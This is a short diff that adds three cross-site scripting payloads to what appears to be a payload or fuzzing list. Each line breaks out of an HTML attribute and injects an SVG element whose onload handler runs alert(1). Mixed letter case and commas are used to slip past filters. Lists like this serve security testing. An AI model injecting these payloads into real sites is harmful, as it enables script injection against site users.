@@ -1,0 +1,3 @@
+\\\">,<SvG/,onload=,alert(1) ,id=xss,>
+\\\">,<Svg/,onload=,alert(1) ,class=xss,>
+'>,<sVg/,onload=,alert(1) ,id=xss,>
